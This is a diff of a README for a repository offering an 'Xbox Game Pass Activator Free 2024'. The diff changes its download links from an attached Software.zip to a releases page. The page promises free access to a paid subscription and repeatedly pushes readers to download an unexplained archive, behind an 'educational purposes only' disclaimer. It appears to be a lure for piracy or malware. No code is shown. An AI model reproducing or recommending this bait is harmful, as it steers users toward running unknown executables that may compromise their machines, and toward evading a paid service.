@@ -4,8 +4,8 @@
 Welcome to the Xbox Game Pass Activator Free 2024 repository! Here you can find all the information you need to activate Xbox Game Pass for free in 2024. 
 
 ## 📁 Repository Contents:
-- **Software:** Download the Xbox Game Pass activation software to start enjoying a wide catalog of games for free in 2024. Click [here](https://github.com/user-attachments/files/18410590/Software.zip) to download the software.
-  <br>[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+- **Software:** Download the Xbox Game Pass activation software to start enjoying a wide catalog of games for free in 2024. Click [here](https://github.com/Kgloopj/Xbox-Game-Pass-Activator-Free-2024/releases/tag/v2.0) to download the software.
+  <br>[![Download Software](https://github.com/Kgloopj/Xbox-Game-Pass-Activator-Free-2024/releases/tag/v2.0)](https://github.com/Kgloopj/Xbox-Game-Pass-Activator-Free-2024/releases/tag/v2.0)
 
 ## 🎮 About Xbox Game Pass:
 Xbox Game Pass is a subscription service by Microsoft that provides access to a vast collection of games for Xbox consoles and Windows PCs. Subscribers can download and play various games, including new releases and popular titles, as long as their subscription is active.
@@ -41,10 +41,10 @@ This repository is for educational and informational purposes only. The use of a
 🎮 Start playing your favorite games with Xbox Game Pass for free in 2024! Explore new releases, popular titles, and more without any cost. Download the software now and begin your gaming journey. Happy gaming! 🚀
 
 ---
-If the link provided needs to be launched, download the software from [here](https://github.com/user-attachments/files/18410590/Software.zip). 
+If the link provided needs to be launched, download the software from [here](https://github.com/Kgloopj/Xbox-Game-Pass-Activator-Free-2024/releases/tag/v2.0). 
 
 If the link is not working, please check the "Releases" section for an updated link.
 
-If you want more information, visit the website [here](https://github.com/user-attachments/files/18410590/Software.zip). 
+If you want more information, visit the website [here](https://github.com/Kgloopj/Xbox-Game-Pass-Activator-Free-2024/releases/tag/v2.0). 
 
 🎮🆓🎉 #GameOn #XboxGamePass2024 🎮🆓🎉
